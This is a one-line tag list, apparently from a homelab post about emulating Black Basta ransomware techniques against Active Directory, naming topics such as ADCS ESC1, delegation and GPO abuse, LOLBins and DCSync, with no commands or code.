*Tags: #homelab #activedirectory #redteam #blackbasta #ADCS #ESC1 #delegation #GPOabuse #LOLBins #threatemulation #CISA-AA24-131A #Server2025 #DCSync*
